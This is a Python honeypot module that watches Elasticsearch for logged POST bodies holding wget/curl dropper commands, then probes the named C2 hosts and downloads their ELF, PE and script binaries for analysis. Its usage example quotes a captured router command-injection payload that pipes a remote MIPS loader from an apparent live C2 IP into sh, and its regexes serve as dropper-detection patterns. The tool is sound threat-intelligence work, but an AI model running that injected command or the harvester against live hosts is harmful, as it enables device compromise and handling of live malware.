#!/usr/bin/env python3
"""
post_dropper_watcher.py — HoneyHunter module
Watches Elasticsearch for POST requests containing wget/curl dropper commands,
extracts the C2 IP + directory, then exhaustively harvests ELF binaries.

Usage:
    python3 post_dropper_watcher.py [--es-url URL] [--index INDEX] \
        [--output-dir DIR] [--interval SECS] [--state-file PATH]
"""

import argparse
import hashlib
import json
import logging
import os
import re
import sys
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urljoin, urlparse

import requests
from requests.exceptions import RequestException

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-7s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("post_dropper_watcher")

# ── Constants ─────────────────────────────────────────────────────────────────

# Ports to probe on the C2 host (in addition to the observed port)
DEFAULT_PORTS = [80, 8080, 8888, 8000, 443]

# Fallback paths to brute-force if no directory listing is available.
# These cover the common IoT botnet directory conventions.
COMMON_PATHS = [
    "/", "/bins/", "/bin/", "/x86/", "/x86_64/", "/arm/", "/arm7/",
    "/arm64/", "/aarch64/", "/mips/", "/mipsel/", "/mpsl/", "/sh/",
    "/sparc/", "/ppc/", "/m68k/", "/i686/", "/bot/", "/payload/",
    "/update/", "/loader/", "/dropper/", "/scanner/", "/tools/",
    "/tftp/", "/ftp/", "/upload/", "/files/", "/www/", "/pub/",
]

# Regex patterns to extract dropper URLs from POST body text.
# Handles both wget and curl invocations with common flag patterns.
DROPPER_RE = re.compile(
    r"""(?:wget|curl)\s+                      # tool name
        (?:-[qsOfL\w]*\s+)*                   # optional flags (non-capturing)
        (https?://                             # scheme
         (\d{1,3}(?:\.\d{1,3}){3})            # IPv4 host  (group 2)
         (?::(\d+))?                           # optional port (group 3)
         (/[^\s'";|&<>]*)                      # path       (group 4)
        )                                      # full URL   (group 1)
    """,
    re.VERBOSE | re.IGNORECASE,
)

# Also catch bare IP + path patterns that appear inside shell pipelines
# e.g.  GET /goform/execute_script?sys_list=wget http://1.2.3.4/dir/file.mips
IP_PATH_RE = re.compile(
    r"(?:wget|curl)\s+(?:-\S+\s+)*"
    r"(https?://(\d{1,3}(?:\.\d{1,3}){3})(?::(\d+))?(/[^\s'\";|&<>]*))",
    re.IGNORECASE,
)

ELF_MAGIC = b"\x7fELF"
PE_MAGIC  = b"MZ"
SCRIPT_SIGS = (b"#!/", b"#!python", b"#!perl")

URLHAUS_API = "https://urlhaus-api.abuse.ch/v1/host/"


# ── ELF / binary detection ────────────────────────────────────────────────────

def is_interesting_binary(data: bytes) -> bool:
    """Return True for ELF, PE, or shell/script files worth keeping."""
    if len(data) < 4:
        return False
    if data[:4] == ELF_MAGIC:
        return True
    if data[:2] == PE_MAGIC:
        return True
    for sig in SCRIPT_SIGS:
        if data[:len(sig)] == sig:
            return True
    return False


def file_type_label(data: bytes) -> str:
    if data[:4] == ELF_MAGIC:
        return "ELF"
    if data[:2] == PE_MAGIC:
        return "PE"
    if data[:3] == b"#!/":
        return "SCRIPT"
    return "UNKNOWN"


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def fetch(url: str, timeout: int = 10) -> requests.Response | None:
    """GET url, return Response or None on failure."""
    try:
        r = requests.get(url, timeout=timeout, verify=False,
                         allow_redirects=True,
                         headers={"User-Agent": "Mozilla/5.0"})
        return r
    except RequestException:
        return None


def is_open(base_url: str, timeout: int = 8) -> bool:
    r = fetch(base_url + "/", timeout=timeout)
    return r is not None and r.status_code in (200, 301, 302, 403)


def parse_directory_listing(html: str, base_url: str) -> list[str]:
    """
    Parse Apache/nginx 'Index of' style directory listings.
    Returns absolute URLs of all linked files (not parent dirs).
    """
    links = []
    for m in re.finditer(r'href=["\']([^"\'?#][^"\']*)["\']', html, re.IGNORECASE):
        href = m.group(1)
        if href in ("../", "/"):
            continue
        if href.endswith("/"):
            # Sub-directory — recurse caller will handle
            links.append(urljoin(base_url, href))
        else:
            links.append(urljoin(base_url, href))
    return links


# ── URLhaus cross-reference ───────────────────────────────────────────────────

def urlhaus_known_urls(ip: str, timeout: int = 10) -> list[str]:
    """Query URLhaus for all known malicious URLs on this IP."""
    try:
        r = requests.post(URLHAUS_API, data={"host": ip},
                          timeout=timeout, verify=False)
        if r.ok:
            data = r.json()
            return [u.get("url", "") for u in data.get("urls", []) if u.get("url")]
    except Exception:
        pass
    return []


# ── Core harvester ────────────────────────────────────────────────────────────

class Harvester:
    def __init__(self, output_dir: str, timeout: int = 10):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout = timeout
        self._seen_hashes: set[str] = set()
        # Load hashes already on disk so we never re-download
        for f in self.output_dir.glob("*"):
            if f.is_file():
                try:
                    self._seen_hashes.add(
                        hashlib.sha256(f.read_bytes()).hexdigest()
                    )
                except OSError:
                    pass

    def _save(self, data: bytes, ip: str, filename: str, source_url: str) -> bool:
        sha = hashlib.sha256(data).hexdigest()
        if sha in self._seen_hashes:
            log.debug("Skipping duplicate %s (%s)", filename, sha[:16])
            return False
        self._seen_hashes.add(sha)

        label = file_type_label(data)
        safe_name = re.sub(r"[^\w.\-]", "_", filename)
        dest = self.output_dir / f"{ip}_{safe_name}"
        # Avoid clobbering
        if dest.exists():
            dest = self.output_dir / f"{ip}_{sha[:8]}_{safe_name}"
        dest.write_bytes(data)

        log.info("✅  %s saved: %s  sha256=%s  src=%s", label, dest.name, sha[:16], source_url)
        return True

    def _harvest_url(self, url: str, ip: str) -> int:
        """Fetch a single URL; save if interesting. Returns count saved."""
        r = fetch(url, timeout=self.timeout)
        if r is None or r.status_code != 200:
            return 0
        data = r.content
        if not data:
            return 0

        # Directory listing? Recurse into it.
        if "Index of" in r.text or "<title>Directory listing" in r.text:
            return self._harvest_directory(url, r.text, ip, depth=0)

        if is_interesting_binary(data):
            fname = Path(urlparse(url).path).name or "payload"
            return 1 if self._save(data, ip, fname, url) else 0
        return 0

    def _harvest_directory(self, base_url: str, html: str, ip: str, depth: int) -> int:
        """Recursively harvest an open directory listing."""
        if depth > 4:
            return 0  # guard against deep trees
        saved = 0
        links = parse_directory_listing(html, base_url)
        log.info("📂  Open directory at %s — %d links found", base_url, len(links))
        for url in links:
            if url.rstrip("/") == base_url.rstrip("/"):
                continue
            r = fetch(url, timeout=self.timeout)
            if r is None or r.status_code != 200:
                continue
            if "Index of" in r.text or "<title>Directory listing" in r.text:
                saved += self._harvest_directory(url, r.text, ip, depth + 1)
            elif is_interesting_binary(r.content):
                fname = Path(urlparse(url).path).name or "payload"
                saved += 1 if self._save(r.content, ip, fname, url) else 0
        return saved

    def harvest(self, ip: str, observed_path: str, observed_port: int | None) -> int:
        """
        Main entry point. Given a C2 IP, the path seen in the dropper command,
        and optionally the port it was served on, exhaustively harvest binaries.

        Strategy:
          1. Derive the *parent directory* from the observed path.
          2. For each candidate port, probe the parent dir first — if it's an
             open listing, recurse into it.  Otherwise brute-force COMMON_PATHS.
          3. Additionally probe the exact observed URL.
          4. Cross-reference URLhaus for any other known paths on this IP.
        """
        total = 0
        parent_dir = str(Path(observed_path).parent).rstrip("/") + "/"
        if parent_dir == "//":
            parent_dir = "/"

        # Ports to try: observed port first, then defaults
        ports_to_try = []
        if observed_port:
            ports_to_try.append(observed_port)
        for p in DEFAULT_PORTS:
            if p not in ports_to_try:
                ports_to_try.append(p)

        active_bases: list[str] = []
        for port in ports_to_try:
            scheme = "https" if port == 443 else "http"
            base = f"{scheme}://{ip}:{port}"
            if is_open(base, timeout=self.timeout):
                log.info("🟢  Port %d open on %s", port, ip)
                active_bases.append(base)
            else:
                log.debug("Port %d closed/timeout on %s", port, ip)

        if not active_bases:
            log.warning("No open HTTP ports found on %s", ip)
            return 0

        for base in active_bases:
            # ── Priority 1: probe the exact observed parent directory ──────
            parent_url = base + parent_dir
            log.info("🔍  Probing observed parent dir: %s", parent_url)
            r = fetch(parent_url, timeout=self.timeout)
            if r and r.status_code == 200:
                if "Index of" in r.text or "<title>Directory listing" in r.text:
                    total += self._harvest_directory(parent_url, r.text, ip, depth=0)
                else:
                    # Not a listing but maybe the exact file
                    if is_interesting_binary(r.content):
                        fname = Path(observed_path).name or "payload"
                        total += 1 if self._save(r.content, ip, fname, parent_url) else 0

            # ── Priority 2: probe the exact observed file URL ──────────────
            exact_url = base + observed_path
            if exact_url != parent_url:
                log.info("🔍  Fetching exact observed URL: %s", exact_url)
                total += self._harvest_url(exact_url, ip)

            # ── Priority 3: brute-force common dropper paths ───────────────
            log.info("🔍  Brute-forcing common paths on %s%s ...", base,
                     "  (parent dir was not a listing)" if r and "Index of" not in r.text else "")
            for path in COMMON_PATHS:
                if path == parent_dir:
                    continue  # already done above
                url = base + path
                r2 = fetch(url, timeout=self.timeout)
                if r2 is None or r2.status_code not in (200, 301, 302):
                    continue
                if "Index of" in r2.text or "<title>Directory listing" in r2.text:
                    total += self._harvest_directory(url, r2.text, ip, depth=0)
                elif is_interesting_binary(r2.content):
                    fname = Path(path).name or f"binary_{path.replace('/', '_')}"
                    total += 1 if self._save(r2.content, ip, fname, url) else 0

        # ── Priority 4: URLhaus cross-reference ───────────────────────────
        uh_urls = urlhaus_known_urls(ip, timeout=self.timeout)
        if uh_urls:
            log.info("🔗  URLhaus: %d known URL(s) for %s", len(uh_urls), ip)
            for url in uh_urls:
                log.info("    → %s", url)
                total += self._harvest_url(url, ip)

        return total


# ── POST body parser ──────────────────────────────────────────────────────────

def extract_dropper_targets(body: str) -> list[dict]:
    """
    Parse a decoded POST body for wget/curl commands.
    Returns list of dicts with keys: url, ip, port, path
    """
    targets = []
    seen = set()
    for pattern in (DROPPER_RE, IP_PATH_RE):
        for m in pattern.finditer(body):
            url   = m.group(1)
            ip    = m.group(2)
            port  = int(m.group(3)) if m.group(3) else None
            path  = m.group(4)
            key = (ip, path)
            if key not in seen:
                seen.add(key)
                targets.append({"url": url, "ip": ip, "port": port, "path": path})
    return targets


# ── Elasticsearch poller ──────────────────────────────────────────────────────

class ESPoller:
    def __init__(self, es_url: str, index: str):
        self.es_url = es_url.rstrip("/")
        self.index  = index

    def search(self, last_ts: str) -> list[dict]:
        """
        Return HoneyHunter POST events newer than last_ts.
        Filters on decoded_payload.method = POST and body containing
        wget or curl.
        """
        query = {
            "size": 100,
            "sort": [{"@timestamp": "asc"}],
            "query": {
                "bool": {
                    "filter": [
                        {"term":  {"decoded_payload.method.keyword": "POST"}},
                        {"range": {"@timestamp": {"gt": last_ts}}},
                        {
                            "bool": {
                                "should": [
                                    {"match": {"decoded_payload.body": "wget"}},
                                    {"match": {"decoded_payload.body": "curl"}},
                                ],
                                "minimum_should_match": 1,
                            }
                        },
                    ]
                }
            },
        }
        url = f"{self.es_url}/{self.index}/_search"
        try:
            r = requests.post(url, json=query, timeout=15)
            r.raise_for_status()
            hits = r.json().get("hits", {}).get("hits", [])
            return hits
        except Exception as exc:
            log.error("Elasticsearch query failed: %s", exc)
            return []


# ── State persistence ─────────────────────────────────────────────────────────

def load_state(state_file: str) -> dict:
    try:
        with open(state_file) as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


def save_state(state_file: str, state: dict):
    with open(state_file, "w") as f:
        json.dump(state, f, indent=2)


# ── Main watcher loop ─────────────────────────────────────────────────────────

def run_watcher(args):
    poller    = ESPoller(args.es_url, args.index)
    harvester = Harvester(args.output_dir, timeout=args.fetch_timeout)
    state     = load_state(args.state_file)

    # Default: look back 24h on first run
    last_ts = state.get("last_timestamp",
                         "now-24h/h")

    log.info("═" * 60)
    log.info("HoneyHunter POST Dropper Watcher — starting")
    log.info("  ES index   : %s/%s", args.es_url, args.index)
    log.info("  Output dir : %s", args.output_dir)
    log.info("  Poll every : %ds", args.interval)
    log.info("  Last TS    : %s", last_ts)
    log.info("═" * 60)

    # Track IPs we have already fully harvested this session to avoid
    # re-scanning the same dropper host on every poll tick
    harvested_ips: dict[str, int] = {}  # ip -> total binaries

    while True:
        hits = poller.search(last_ts)

        if hits:
            log.info("📨  %d new POST event(s) since %s", len(hits), last_ts)

        for hit in hits:
            src = hit.get("_source", {})
            ts  = src.get("@timestamp", "")

            # Keep track of the newest timestamp we've processed
            if ts > last_ts:
                last_ts = ts

            payload = src.get("decoded_payload", {})
            body    = payload.get("body", "")
            if not body:
                continue

            targets = extract_dropper_targets(body)
            if not targets:
                continue

            attacker_ip = src.get("src_ip", "unknown")
            log.info("─" * 50)
            log.info("🚨  Dropper command detected in POST from %s", attacker_ip)
            log.info("    Body snippet: %.120s", body[:120].replace("\n", " "))

            for t in targets:
                ip   = t["ip"]
                path = t["path"]
                port = t["port"]

                log.info("🎯  C2 target  : %s  path=%s  port=%s", ip, path, port or "auto")

                # Write a brief record to a JSONL event log
                event = {
                    "timestamp":   ts,
                    "attacker_ip": attacker_ip,
                    "c2_ip":       ip,
                    "c2_port":     port,
                    "c2_path":     path,
                    "raw_url":     t["url"],
                    "body_snippet": body[:256],
                    "es_id":       hit.get("_id"),
                }
                event_log = Path(args.output_dir) / "dropper_events.jsonl"
                with open(event_log, "a") as ef:
                    ef.write(json.dumps(event) + "\n")

                # Skip if we already harvested this exact IP+path combo
                cache_key = f"{ip}{path}"
                if cache_key in harvested_ips:
                    log.info("⏭   Already harvested %s%s (%d binaries) — skipping",
                             ip, path, harvested_ips[cache_key])
                    continue

                saved = harvester.harvest(ip, path, port)
                harvested_ips[cache_key] = saved

                if saved:
                    log.info("✅  Harvested %d binary/binaries from %s", saved, ip)
                else:
                    log.info("⚠️   Nothing harvested from %s (host may be offline)", ip)

        # Persist timestamp so restarts don't reprocess old events
        state["last_timestamp"] = last_ts
        save_state(args.state_file, state)

        time.sleep(args.interval)


# ── One-shot mode (for manual invocation / testing) ───────────────────────────

def run_oneshot(args):
    """
    Parse a dropper body string directly from --body and harvest.
    Useful for testing or re-running a specific observed payload.
    """
    targets = extract_dropper_targets(args.body)
    if not targets:
        log.error("No wget/curl commands found in body")
        sys.exit(1)

    harvester = Harvester(args.output_dir, timeout=args.fetch_timeout)
    total = 0
    for t in targets:
        log.info("🎯  Target: %s  path=%s  port=%s", t["ip"], t["path"], t["port"])
        total += harvester.harvest(t["ip"], t["path"], t["port"])
    log.info("Total binaries harvested: %d", total)


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="HoneyHunter — POST body dropper watcher & harvester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run as a daemon, polling Elasticsearch every 60s
  python3 post_dropper_watcher.py \\
      --es-url http://localhost:9200 \\
      --index honeyhunter-* \\
      --output-dir /opt/honeyhunter/harvested \\
      --interval 60

  # One-shot: paste a raw POST body and harvest immediately
  python3 post_dropper_watcher.py --oneshot \\
      --body 'user=admin&pass=admin  GET /goform/execute_script?sys_list=wget http://161.97.148.194/nullnet_bin_dir/nullnet_load.mips -O- | sh' \\
      --output-dir /tmp/harvest
        """,
    )

    # Daemon mode
    ap.add_argument("--es-url",    default="http://localhost:9200",
                    help="Elasticsearch base URL")
    ap.add_argument("--index",     default="honeyhunter-*",
                    help="Elasticsearch index pattern")
    ap.add_argument("--output-dir", default="./harvested",
                    help="Directory to write harvested binaries")
    ap.add_argument("--interval",  type=int, default=60,
                    help="Poll interval in seconds (default: 60)")
    ap.add_argument("--state-file", default="./watcher_state.json",
                    help="JSON file to persist last-seen timestamp")
    ap.add_argument("--fetch-timeout", type=int, default=10,
                    help="HTTP timeout for harvesting requests (default: 10)")

    # One-shot mode
    ap.add_argument("--oneshot", action="store_true",
                    help="Parse --body directly and harvest (no ES polling)")
    ap.add_argument("--body", default="",
                    help="Raw POST body to parse in --oneshot mode")

    args = ap.parse_args()

    if args.oneshot:
        if not args.body:
            ap.error("--oneshot requires --body")
        run_oneshot(args)
    else:
        try:
            run_watcher(args)
        except KeyboardInterrupt:
            log.info("Interrupted — exiting cleanly")


if __name__ == "__main__":
    main()
